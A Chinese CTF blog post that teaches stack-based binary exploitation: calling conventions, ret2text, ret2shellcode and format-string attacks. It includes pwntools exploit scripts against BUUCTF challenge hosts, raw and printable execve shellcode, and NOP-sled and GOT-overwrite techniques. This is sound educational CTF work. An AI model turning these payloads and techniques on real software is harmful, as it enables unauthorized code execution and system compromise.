---
title: "CTF-user-pwn 栈漏洞学习总结 0x10 版"
description: "在学习日志 0x00 版进行了优化与删减，如有错误请指出。"
date: 2026-03-11T00:00:00+08:00
image: ctf_pwn_stack.png
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---

## 前言

使用环境 ：wsl kali linux

```
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2025.3"
VERSION="2025.3"
VERSION_CODENAME=kali-rolling
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31
```

栈漏洞是 pwn 手的入门阶段，所以本文将从汇编讲起。

如果没有底层的重大谬误，这一版应该是栈漏洞的最终版，之后可能只会看心情打补丁。

写这篇总结的原因是发现，最初边学边写的学习日志有相当一部分的重复题型与不明概念，大量无意义图片，今天重写，也是为了更好的巩固栈漏洞，预计在今年 4 月正式开始学堆漏洞。

这篇博客依然有高风险出现以下情况：

* 多变的代码风格
* 无力的叙述语言
* 半对半错的理解
* 效率低下的调试

请见谅，如有错误请指出。

![98e80b34343ce49fa1e5d7b94f7a0a8e](https://github.com/user-attachments/assets/f62be8b4-e0a8-48a9-b219-176d188e59fd)


更新日志：

* upd on 2026.3.11：初发布。


---

## Reference

在学习过程中参考了以下文章或博客，感谢前辈：

[CTF-wiki](https://ctf-wiki.org/)

[hello ctf](https://hello-ctf.com/home/)

[bilibili:高中生教你 CTF pwn（用户态）](https://www.bilibili.com/video/BV1gQGizqE1U?spm_id_from=333.788.videopod.sections&vd_source=69aa8bfd2f389eec2562a6757236f432)

[shellcode 的艺术](https://xz.aliyun.com/news/6249)

[生成可打印的shellcode](https://xz.aliyun.com/news/5275)

[buuctf之pwn题(持续更新)](https://www.z1r0.top/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/)

[SROP 攻击原理与例题解析](https://www.anquanke.com/post/id/217081)

[栈溢出之ret2csu](https://www.cnblogs.com/zq10/p/14385929.html)

[CTF-user-pwn 栈漏洞学习日志 0x00 版](https://sonnety14.github.io/sonnety_blog/p/ctf-pwn-%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97-0x00-%E7%89%88/)

[CTF pwn 杂题乱写 0x00 版](https://sonnety14.github.io/sonnety_blog/p/ctf-pwn-%E6%9D%82%E9%A2%98%E4%B9%B1%E5%86%99-0x00-%E7%89%88/)

---

## 安全保护检查

设某道题附加可执行文件 pwn。

`file pwn` 主要查看三个信息：

* `ELF 64-bit` 或 `ELF 32-bit`：**64 位参数走寄存器，32 位参数走栈上。**
* `LSB` 或 `MSB`：
  * **LSB 是小端序，低位字节放在低地址，地址在内存倒着写**（比如地址 0x11223344，在内存中：44 33 22 11），在本阶段我们绝大多数题目都是小端序。
  * MSB 是大端序，高位字节放在低地址。
* `dynamically linked` 或 `statically linked`：
  * dynamically linked 是动态链接，程序文件小，**自己不带系统函数，运行时要去借用操作系统的 `libc.so`。**
  * statically linked是静态链接，程序文件大，在编译时，把 `printf, read` 这些库函数的底层代码全部硬塞进了程序里，**这使得 ROPgadget 非常全，可以靠大量 gadgets 堆叠拿shell。**

`pwn checksec pwn` 查看常见的安全保护：

* Arch: 
  * `i386-32-little`：32 位，小端，参数多在栈上传。
  * `amd64-64-little`：64 位，小端，参数通常走寄存器。
* RELRO：
  * `No RELRO`：GOT 表可写、可在运行时继续解析，更容易做 GOT 覆写。
  * `Partial RELRO`：启用了部分保护：`.got` `.plt` 仍可能可写。
  * `Full RELRO`: GOT 在解析完成后会被设成只读，基本堵死 GOT 覆写路线（但不影响 ret2libc/ROP 泄露）
* Stack:
  * `Canary found`：有栈保护，溢出覆盖返回地址前会先覆盖 canary，函数返回时会检查。
  * `No canary found`：没 canary，栈溢出更直接。
* NX：
  * `NX enabled`：栈/堆大多不可执行。
  * `NX disabled`：可执行栈。
* PIE：
  * `PIE enabled`：程序本体代码段地址也会随机化（每次运行基址变）。
  * `No PIE (0x400000)`：程序本体地址固定（常见起点 0x400000），libc 仍可能因 ASLR 随机。

---
 
## user pwn 的目标

pwn 大抵分 Kernel PWN（内核态利用）和 User-space PWN（用户态利用），我们本博客属于 User-space PWN 的初级形态。

**user pwn 的目标只有一个，那就是 get shell。**

**在 CTF 比赛中，就是执行 `system("/bin/sh")` 或 `execve("/bin/sh", 0, 0)`。**

---

## 初识汇编语言

虽然现在 IDA 可以得到 C 的伪代码，但是还是要至少理解程序执行的原理与逻辑。

以 `C++` 为代表的高级语言，与汇编语言有很大的区别，其中有个区别在于 **如何传递参数** ，而且**对于 64位 和 32位 的程序来讲，参数的传递方式也有所不同**。

```cpp
#include<stdio.h>

int main(){
    printf("hello world");
    return 0;
}
```

以上述代码（设为 `main.c`）为例，这里的“参数”指的就是字符串 "hello world" 的内存地址。

在 `C` 这类高级语言中，你不需要操心这个字符串放在哪，也不需要操心 printf 怎么拿到它，编译器会帮你搞定一切。

但是从汇编语言的角度来讲，CPU 在执行 `printf` 函数时（即汇编语言中 `call printf` 指令），必须先把参数准备好，**64 位放到寄存器上，32 位放到栈上**，`printf` 来了直接拿。

### 寄存器与参数调用约定

大多 64 位寄存器以 r 开头（Register），32 位寄存器以 e 开头（Extended）。

拿 64 位程序的 `write(fd,buf,len)` 来说，write 需要三个参数，那么程序正常运行的话，就会**在 call write 之前就会把这三个参数按 rdi，rsi，rdx 的顺序填进去**，执行 write 时，cpu 就会把这三个参数从对应的寄存器取出来。

至于 32 位的程序，**在 call 之前直接布置到栈上**，执行 write 时，cpu 就会把这几个参数从栈上取出来。

（怎么取的下文会说）

寄存器通常很小，64 位程序的寄存器有 64位（8个字节），32 位程序的寄存器只有 32位（4 个字节），**所以在寄存器里往往装的是参数的地址**，而不是 “hello world” 一类很长的字符串。

由于 32 位的传参根本不用寄存器，所以这里只说 64 位。

1. `rdi`，Destination Index（目的）。
2. `rsi`，Source Index （源）。
3. `rdx`，Data（数据）。
4. `rcx`，Counter（计数）。
5. `r8`，第 8 号。
6. `r9`，第 9 号。

在 64 位程序中，我们也经常发现 32 位的寄存器，比如 eax，其实在 64 位程序中，eax 就是 rax 的低 32 位（右半边），ax 就是 eax 的低 16 位（右半边），al 就是 ax 的低 8 位（low，右半边），ah 就是 ax 的高 8 位（high，左半边）。

### 寄存器与系统调用约定

32 位，当你执行 `int 0x80` （Interrupt 0x80）时，CPU 会立刻暂停手头的用户态工作，切换到最高特权级，去内核的“中断向量表”里找 0x80 号对应的处理程序。

比如 execve 需要传 3 个参，32 位对应的系统调用号是 11，那么**在触发 `int 0x80` 时，cpu 就会从 eax 取系统调用号，从 ebx，ecx，edx 依次取出参数。**

**32 位系统调用传参顺序：ebx，ecx，edx，esi，edi，ebp。**

64 位，当你执行 syscall 时，CPU 状态直接切换到内核态。

比如 execve 需要传 3 个参，64 位对应的系统调用号是 59，那么**在触发 syscall 时，cpu 就会从 rax 取系统调用号，从 rdi，rsi，rdx 依次取出参数。**

**64 位系统调用传参顺序：rdi, rsi, rdx, r10, r8, r9。**

通过 `pwn constgrep -c amd64 execve` 可以查 64 位的 execve 等函数的系统调用号，`pwn constgrep -c i386 execve` 则是 32 位的。

### 栈区 rbp rsp 与代码区 rip

对于每一个程序，其启动的时候，内核会为其分配一段 **内存，称为栈**，遵循先进后出。

这里要先介绍三个十分重要的寄存器：栈顶 esp/rsp，栈底 ebp/rbp，**下一条即将执行的**命令 rip/eip。

其中 rsp，rbp 在栈区，rip 在代码区，**两者互不相干**。

同所有其他的寄存器一样，rsp/rbp 也**不会**无缘无故的像个“光标”一样任意移动，只有特定操作才会使其移动。**而 rip/eip 不可直接修改。**

rip/eip 与大多寄存器不同，大多寄存器，不特意操作是不会移动的，但是 rip/eip 只要在 cpu 从内存取出了一条指令（如 `mov rax,1`），rip 就会自然下移（下移多少你别管），指向下一个指令的开头，

我们对栈的一切操作，最终的目的都是为了把目标地址，塞进 rip/eip 里。

* push 即入栈，**栈的生长方向是 高地址 → 低地址**，`push eax` 会把栈顶 esp 的值减去 4，然后再把 eax 的值压入 esp 新指向的内存地址中。

* pop 即出栈，`pop eax` 会 **先从当前的 esp 指向的内存地址复制值** 放入eax，然后再把 esp 的值加 4。

值得一提的是，pop 出栈时，esp 虽然往高地址走了，看似“取出”了那个值，**但是其实那个数据并没有清除或消失**，所以这里严谨说是“拷贝”，下文直接说“取出”。

（有点像 steam 的删除游戏，只是逻辑上释放了空间，但是并没有删除，只是再下载数据的时候直接覆写）

* mov 即赋值，它是**纯粹的赋值指令**，如 `mov rsi, r14` 把 r14 的值赋值给 rsi，只要不给 esp 赋值，esp 不会动。

* sub 即减，如 `sub esp,0x20`，这使得 esp 上移了 0x20 个字节，**相当于拉开了一个新的空白区域**。

比如某个函数里定义了局部变量（如 `int a; char buf[0x20];`），那么执行 `sub esp,0x20` 就会让 esp 上移一个 buf 的距离。

注意这里相当于**只是移动了 esp 这个指针，而不更改这之间的内容。**

* add 即加，如 `add esp,0x20`，这使得 esp 下移了 0x20 个字节，**释放了一个区域的空间**。

同样，add **只动指针，不动数据**。

### 调用函数与系统库

假设 CPU 正在执行 位于 0x00 的 call 指令，而紧挨着它的下一条指令在 0x04，我们 call 的函数真实地址在 0xe4。

在准备好参数之后，call 指令可以拆成以下两步：

* `push rip`：把下一条指令压入栈中（备份 rip）。
* `jmp target`：把目标地址赋给 rip。

所以其目标地址指向的代码段**往往结尾有 ret，等效于 pop rip**，把备份的 rip 重新要回来，否则备份的 rip 会破坏我们针对题目构造的栈结构。

而进入目标函数之后，大部分函数**立刻执行 `push rbp`（或 ebp）把旧的栈底压入栈**。

然后 **再执行 `mov ebp, esp`** 确立当前的栈顶为现在的新栈底，开辟了当前函数新的栈区。

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x20` | `old rbp` | 保存的旧栈底 |
| `0x28` | `saved RIP` | 返回地址 |
| `.....` |  |  |

（通常第三步尤其是 read，就会有 `sub esp` 指令让 esp 上移，这样就**完成了新栈的开辟**）

而退出函数时，大部分函数会执行 `leave`（相当于 `mov rsp,rbp;pop rbp;`）会恢复之前的栈顶和栈底，然后执行 ret 恢复 rip。

至此，函数的调用结束，**恢复了旧栈**。

（当然如果 call 了一个非常简单的小片段，比如 `mov rax 15;ret` 就没什么开辟新栈，恢复旧栈的操作了）

call 后面既可以跟 call rax 这种间接跳转，也可以 call 0x400123 这种相对跳转，我们还会见到形如 call printf@plt 这样的两级跳转。

这是因为，调用系统函数（如 `printf` 这种系统自带的库函数）时，由于 ASLR（Address Space Layout Randomization，地址空间布局随机化）机制，导致**系统库 libc 的内存地址在每一次运行中位置不同。**

但是，系统库的位置是变化的，`printf` 等函数相对系统库的位置却是固定的，于是我们称这个相对距离叫 **偏移量**。

既然 `printf` 的内存地址的变化的，那么我们需要知道 `printf` 具体在哪，这就需要两个工具：

* `PLT`（过程链接表 - Procedure Linkage Table）
* `GOT`（全局偏移表 - Global Offset Table）

在**没有开启 Full RELRO 的情况**下，`PLT` 执行以下两种操作：

1. 若要访问的地址已经存在于 `GOT` 中：直接访问。

2. 若要访问的地址不存在于 `GOT` 中，那么使用 **“动态链接器 `ld-linux.so`”** 现查这个地址，再把它写入 `GOT` 中。

具体怎么实现不再展开。

`PLT` 与 `GOT` 有点类似于 **接线员和通讯录** 的关系，又有点像 **搜索后的记忆化** 。

而 `GOT` 表 是一块可读写的白板，而且接线员 (`PLT`) 对通讯录 (`GOT`) **是绝对信任的**，那么我们可以通过更改 `GOT` 的方法使得程序执行特定的命令。

这就是 **GOT 表覆写攻击**。

也可以通过这个得到 printf 的真实地址，从而通过偏移量得到 libc 的基质，即**十分重要的 ret2libc**。

而在开启了FULL RELOAD 的情况下，**程序启动时**，操作系统会暴力穷举，把所有 1000 个函数的真实地址一次性全部找齐，硬塞进 GOT 表里，然后**把 GOT 表权限改为只读**。

没有延迟绑定了，GOT 表覆写攻击也失效了，ret2libc 还可以用。

### 全局数据区域

即我们在 IDA 中经常看到的 `.data`，`.bss`，`.rodata` 等区域。

* `.data`：放的是程序里已经初始化的全局变量和静态变量。
* `.bss`：存放的是程序里未初始化（或者初始化为 0）的全局变量和静态变量。
* `.rodata`：read-only-data，存放的是程序里的常量和字符串字面量。

在后续的 **栈迁移** 中，我们通常选择没有初始化的安全的 bss 段作为首选栈。

---

## 栈溢出 Ret2text

ret2text 的使用场景，即 read 的读入长度 **至少能覆盖返回地址（saved RIP）** && **存在后门函数时** && **没有 canary 保护**

### 实现原理

栈溢出的本质，其实是**“方向的碰撞”**。

上面提到：

> **栈的生长方向是 高地址 → 低地址**

即 push 会让 rsp/esp 减小。

而 **数据的写入方向是 低地址 → 高地址。**

如果函数片段形如

```
sub rsp, 0x10;
mov rsi, rsp;
call read@plt
```

那么栈上情况形如：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x00` | `buf[0~7]`| padding |
| `0x08` | `buf[8~15]`| padding |
| `0x10` | `old rbp` | 保存的旧栈底 |
| `0x18` | `saved RIP` | 返回地址 |
| `.....` |  |  |

现在，我们利用漏洞，强行输入 0x10 个 'A'，再加上 0x08 个 'B'，最后填上我们想要执行的目标地址。

* A 填满了 buf
* B 覆盖了 rbp
* 目标地址覆盖了 saved RIP

在上面我们的“调用函数与系统库”中详细地解析了函数调用中，栈的新建与销毁的全过程，由于 rbp 我们填了很多的垃圾填充数据，所以恢复的旧栈已经废掉了。

但是 ret 成功劫持了 rip，让 rip 跳转到了我们的目标函数，如果后门函数填的是 `system("/bin/sh")` 一类，那么我们的攻击完成。

至于填多少个填充数据的问题，**一般情况下**

```
char buf[16]; // [rsp+0h] [rbp-10h] BYREF
v0 = read(0, buf, 0x400u);
```

rbp-10h 指的就是其到 rbp 有 0x10 个字节的距离，那么我们填充 0x18 个字节覆盖 old rbp 即可。

在 **特殊情况下**，可能会发现这个函数开头**没有 push rbp**，或者其他的神秘原因，这个计算打不通，就可以考虑 gdb 调试一下。

### gdb 调试找偏移

gdb 调试还是多做题就熟了。

十分简单，就是在 send(payload) 之前加上：

```
gdb.attach(io,"b *断点地址\nc")
pause()
```

在你需要停的地方下断点（ret 之前），然后再 stack 0x20 看看栈上什么情况。

至于 cyclic，感兴趣自行搜索，我感觉一般好用。

比较有用的调试指令：

* bt 可以查看程序当前停在哪一步。
* ni 可以单步运行。
* canary 可以直接查本次运行的 canary 值。

#### 例题 1：jarvisoj_level2

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level2)

※ hint：平凡的栈溢出。

IDA pro exports 窗口发现 hint，里面竟然是 binsh，system 也非常好找。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28040
io = remote(host,port)
offset = 0x88 + 0x4
binsh = 0x804a024
system = 0x804849e
payload = b'A'*offset  + p32(system) + p32(binsh)

def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：ciscn_2019_n_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_n_1)

※ hint：栈溢出也可以改变栈上的其他变量。

IDA 容易发现某变量等于 11.28125 （即 0x41348000）时就会直接 ak，虽然那个变量不可直接修改，但是我们可以栈溢出啊。

<img width="347" height="195" alt="image" src="https://github.com/user-attachments/assets/47a9e491-52b2-4dcf-8682-b0a35e402ed6" />

v1 到 rbp 是 0x30，v2 到 rbp 是 0x4，那么 v1 到 v2 是小学加减法。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 25635
io = remote(host,port)
offset = 0x30 - 0x4
payload = b'A'*offset + p64(0x41348000)     # 11.28125 → 0x41348000

def main():
    io.recvuntil(b"Let's guess the number.\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：pwn1_sctf_2016

[BUU CTF 题目链接](https://buuoj.cn/challenges#pwn1_sctf_2016)

※ hint：栈溢出没有规定一定要在输入时发生。

容易发现有一个后门函数 `getflag`。

然而再考虑栈溢出的时候发现 `fgets` 只留了 32 的长度读入。

<img width="810" height="509" alt="image" src="https://github.com/user-attachments/assets/05f07cec-cb37-4439-b212-44c41b09695d" />

然而仔细一看后面看似没什么用的代码，竟然把输入的 I 变成了 you，变量到 ebp 有 60 字节可以用 20 个 I 代替。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28374
io = remote(host,port)
get_flag = 0x8048f0d

payload = b'I'*20 + b'A'*4 + p32(get_flag)

def main():
    # io.recvuntil(b"Tell me something about yourself: ")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 题单

没有区分特点的题单，零基础可以做做。

BUU CTF 题目链接：

[rip](https://buuoj.cn/challenges#rip)

[warmup_csaw_2016 1](https://buuoj.cn/challenges#warmup_csaw_2016)

[jarvisoj_level0_1](https://buuoj.cn/challenges#jarvisoj_level0)（※ hint：找一个 ret 栈对齐）

[jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)

[ciscn_2019_n_8](https://buuoj.cn/challenges#ciscn_2019_n_8)（※ hint：枚举偏移）

[bjdctf_2020_babystack](https://buuoj.cn/challenges#bjdctf_2020_babystack)

[bjdctf_2020_babystack2](https://buuoj.cn/challenges#bjdctf_2020_babystack2)（※ hint：unsigned 强制转换）

[get_started_3dsctf_2016](https://buuoj.cn/challenges#get_started_3dsctf_2016)（※ hint：后门函数有传参要求，另外记得看看 gdb）

[not_the_same_3dsctf_2016](https://buuoj.cn/challenges#not_the_same_3dsctf_2016)（※ hint：把 flag 放在哪个变量上了）

[jarvisoj_tell_me_something](https://buuoj.cn/challenges#jarvisoj_tell_me_something)

[picoctf_2018_buffer overflow 1](https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%201)

[picoctf_2018_buffer overflow 2](https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%202)

[[ZJCTF 2019]Login](https://buuoj.cn/challenges#[ZJCTF%202019]Login)（※ hint：call rax）


----

## shellcode && Ret2shellcode

shellcode 是一段“机器码字节序列”（比如 x86-64 指令），它自己就能完成系统调用：`execve("/bin/sh",0,0)`，从而 getshell。

我们把 shellcode 填入栈上，再通过栈溢出劫持 rip，使其**指向 shellcode 起始地址**，就会在栈上执行 shellcode。

那么应用场景很明显，就是 **NX 保护没开** && **能够泄露栈地址** && **没有 canary 保护**

### 实现原理

最简单的 `shellcode = asm(shellcraft.sh())` 的含义就是，生成一段打开 `/bin/sh` 的机器码。

比如：

```
shellcode = ``` 
mov rbx, 0x68732f6e69622f
push rbx
push rsp
pop rdi
xor esi, esi
xor edx, edx
push 0x3b
pop rax
syscall```

```

1. `mov rbx, 0x68732f6e69622f`：把字符串 `/bin/sh`（按小端序倒着）塞进寄存器 `rbx`。
2. `push rbx`：把这 8 字节压栈。
3. `push rsp; pop rdi`：让 `rdi` 指向栈顶，也就是指向 `/bin/sh` 那块内存。
4. `xor esi, esi`，`rsi = 0`：argv 设为 NULL。
5. `xor edx, edx`，`rdx = 0`：envp 设为 NULL。
6. `push 0x3b; pop rax`，`rax = 0x3b`：execve syscall 号
7. `syscall`：发起系统调用：execve("/bin/sh", 0, 0)

同理，能执行 shellcode 的题目，`asm("sub esp,0x28;jmp esp")` 也可以执行。

对于部分**对 shellcode 有长度或可见字符检查的题目**，有几个酌情使用的通用 shellcode：

* 不可见版本
  * 32 位 短字节 shellcode 21 字节

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
  * 64 位 较短的 shellcode 23 字节

```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05```
```

* 可见版本
  * x64 下的：

```
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t 
```

  * x32 下的：

```
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA 
```

如果还有更具体的要求，那么要使用 ALPHA3 工具了。

#### 例题 1：mrctf2020_shellcode

[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode)

※ hint：读入长度过短，栈溢出不能，仔细看汇编。

发现直接 jump 到输入的地址上，所以直接打 shellcode。

```
# written by Sonnety
from pwn import *

context.arch = "amd64"
host = "node5.buuoj.cn"
port = 25867
shellcode = asm(shellcraft.sh())


def main():
    io = remote(host,port)
    io.recvuntil(b"Show me your magic!\n")
    io.sendline(shellcode)
    io.interactive()

if __name__ == "__main__":
    main()

```

#### 例题 2：ciscn_2019_s_9

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_9)

※ hint：hint 里面有 jmp esp，竭尽全力让 esp 上放着 shellcode。

然后发现 hint 里面有 jmp esp，那么后面接一个 `sub esp,offset`，esp 上移到 shellcode，那么再 jmp esp 一次就好了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27999
io = remote(host,port)
# io = process("./ciscn_s_9")
elf = ELF("./ciscn_s_9")
# system = elf.sym['system']
hint = 0x8048554

def main():
    io.recvuntil(b"Do you have anything to tell?\n")
    io.recvline()
    shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    payload = shellcode.ljust(0x24,b"\x00")
    payload += p32(hint) + asm("sub esp,0x28;jmp esp")
    # gdb.attach(io,"b *0x8048550\nc")
    # pause()/
    io.sendline(payload)
    io.interactive()
    # payload = p32(system) + p32(0) + p32(shell)


if __name__ == "__main__":
    main()

```

#### 例题 3：jarvisoj_level1

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level1)

※ hint：先跑本地再跑远端。

此题本是大水题，NX 保护没开，注入 shellcode。

本地很顺利跑通了，但是突然发现，远端竟然不把栈泄露给我们，只有我们输入了什么东西，才会回弹给我们。

这太坏了，显然是远端部署了 I/O 缓冲区，在我们正常输入，没有覆盖 ret 地址的时候，正常 exit(0)，正常把结果一次性回显给我们。

显然我们有两种方法，一是直接撑爆缓冲区，爆破它，强行得到泄露的栈。

```
payload = b'A' * 0x8c + p32(main_addr)
    payload = payload.ljust(0x100,b'\x00')
    for i in range(170):
        io.send(payload)
        sleep(0.05)
data = io.recv(4500)
```

这样我们会得到非常非常多的地址：

<img width="370" height="446" alt="image" src="https://github.com/user-attachments/assets/c894f85b-28ae-4c16-ba91-ea484c0ba323" />

仔细观察，发现由于不可抗力，我们最后一个地址就是不完整的，但是倒数第二个是完整的，而且每个地址之间都只差了 0x10.

那么很好了，我们选择尽可能短的 shellcode，并在 shellcode 前面填入尽可能多的 `\x90` （NOP），这样我们就有更多的误差范围内，使返回地址滑到 shellcode 上。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29947
io = remote(host,port)
# io = process("./level1")
elf = ELF("./level1")
main_addr = elf.sym['main']

def main():
    payload = b'A' * 0x8c + p32(main_addr)
    payload = payload.ljust(0x100,b'\x00')
    for i in range(170):
        io.send(payload)
        sleep(0.05)
        
    data = io.recv(4500)
    leak_str = data.split(b"What's this:")[-2][:10]
    leak_stack = int(leak_str, 16) - 0x10
    print("\n[+] Got Leak stack address:", hex(leak_stack))
    shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    payload = b'\x90'*0x70 + shellcode
    payload = shellcode.ljust(0x8C, b'\x00') + p32(leak_stack)
    payload = payload.ljust(0x100,b'\x00')
    io.send(payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

另一种比较平凡，到 bss 段上跑即可，网上可以找找题解。

#### 例题 4：mrctf2020_shellcode_revenge

[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode_revenge)

※ hint：汇编中有明显的 payload 检查，要求 payload 是可见字符。

```
# written by Sonnety
from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")

host = "node5.buuoj.cn"
port = 26289
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"


def main():
    io = remote(host,port)
    io.recvuntil(b"Show me your magic!\n")
    io.send(shellcode)  # sendline() 的 \n 可能会破坏字符检查，应该使用 send()
    # io.recvuntil(b"I Can't Read This!")
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 题单

没有区分特点的题单，零基础可以做做。

shellcode 的题我做的有点少，所以也没多少题目。

NSS CTF：

[nss ctf 题目链接 safe_shellcode](https://www.nssctf.cn/problem/2933)

BUU CTF：

[picoctf_2018_shellcode](https://buuoj.cn/challenges#picoctf_2018_shellcode)

[wdb_2018_3rd_soEasy](https://buuoj.cn/challenges#wdb_2018_3rd_soEasy)

[pwnable_start](https://buuoj.cn/challenges#pwnable_start)（※ hint：理解汇编）

[ez_pz_hackover_2016](https://buuoj.cn/challenges#ez_pz_hackover_2016)（※ hint：gdb）

---

## 格式化字符串漏斗 && Canary 泄露

### fmt 攻击

即出现了类似 `printf(buf)` 的可控漏洞。

正常的输出函数，大概形似 `printf(format, a1, a2, a3, ...)` 这样。

* 32位：

所有的参数全都在栈上。

调用前，程序会按 `x3, x2, x1, "format_string_addr"` 的顺序，把它们从右到左全 push 进栈里。

printf 只要顺着栈顶 esp 一路往下摸，就能完美地依次摸到 x1, x2, x3。

* 64 位：

前 6 个参数在寄存器里。

`rdi = "format_string_addr"` (本体)

`rsi = x1` (第 1 个槽位)

`rdx = x2` (第 2 个槽位)

`rcx = x3` (第 3 个槽位)

printf 会先去掏这几个寄存器，寄存器掏空了，再顺着栈往下摸。

如果我们把 `x1,x2,x3...` 成为参数列表，那么在正常执行时：

* 读取 format 字符串
* 遇到 `%x/%p/%s/%n` 就去“参数列表”里取一个参数来用
  * `%x`：取一个整数打印。
  * `%p`：取一个指针打印。
  * `%n`：取一个“指针”，向这个**指针指向的地址**写入输出长度。

（即假设要通过 fmt 覆写 printf_GOT，那么我们要让 printf_GOT 填入参数列表中，而不是 printf 的真实地址）

并且，在正常的 `printf("format",x1,x2,x3)` 中，我们不能控制 format。

但是，对于 `printf(buf)`，**我们写入的所有形式的 format 都会执行**，所以我们可以输入一串 %p 泄露大量数据，也可以通过 `payload = b"%<len>c%<x>$n"` 向第 x 个参数槽位指向的地址赋值为 len。

什么意思呢，比如我们写入 `"AAAAAAAA" + p32(addr) + 很多很多%p`，%p后面没有传参数，他就会按规矩，从第一个额外参数槽位（rsi 寄存器 或 栈顶紧挨的位置）开始逐个取出输出。

那些槽位里可能装着上一个函数留下来的极其机密的栈地址、可能装着 libc 里的返回地址、甚至可能装着刚刚写在栈上的伪造地址。

我们写入的 `"AAAAAAAA" + p32(addr)` 往往不是第一个参数槽位，因此存在一个偏移，从第一个输出一个个数到出现 `0x4141414141...` 的距离就是 offset。

当我们获取这个 offset，就可以构造 `payload = b"%<len>c" + p32(addr) + b"%<offset>$n"`，控制向 addr 写入 len + 4.

另外，**由于 printf 认为 `\x00` 截断，但是 64 位系统下内存地址往往包含 `\x00`**，如`\x18\x10\x60\x00\x00\x00\x00\x00`，会造成 printf 半路返回，所以 64 位的 payload 要把 p64(addr) 放到最后。

此时我们的 `payload = b"%<len>c%<offset+?>$n" + b'A'*padding + p64(addr)`，`padding` 的目的是让 `b"%<len>c%<offset+?>$n" + b'A'*padding` 这一串的字符串长度是 8 的倍数，使 addr 落在整 8 字节的槽位上。

`offset+?` 需要动态调试得到，一般多两三位，

结果将向 addr 写入 len。

最后，**如果我们想要向 got 表写入信息（0x7fxxxxxx）**，用 `%n` 过大的输出量会直接卡死靶机，所以可以使用 pwntools 自带的 `fmtstr_payload(8,{printf_got:one_gadget},write_size="byte",numbwritten=0xa)` 工具自动生成，含义为 **在已经输出了 0xa 个字节的前提下，向第 8 个参数槽位指向的地址写入 one_gadget**。

（原理是 %hn）

### Canary 绕过

在 “常见安全保护中”，我们曾提到：

> `Canary found`：有栈保护，溢出覆盖返回地址前会先覆盖 canary，函数返回时会检查。

Canary 栈保护的核心思想，就是在函数的栈上放一段“哨兵值”（canary），函数返回前检查它有没有被覆盖；被覆盖就说明发生了溢出，直接终止程序。

在 **无 Canary 保护** 的栈上，大概形似：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x00` | `buf[0~20]` | padding |
| `0x20` | 其他局部变量 | 可选 |
| `0x30` | old rbp |  |
| `0x38` | saved RIP | 返回地址 |


在 **有 Canary 保护** 的栈上，大概形似：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x00` | `buf[0~20]` | padding |
| `0x20` | 其他局部变量 | 可选 |
| `0x30` | canary | 夹在中间 |
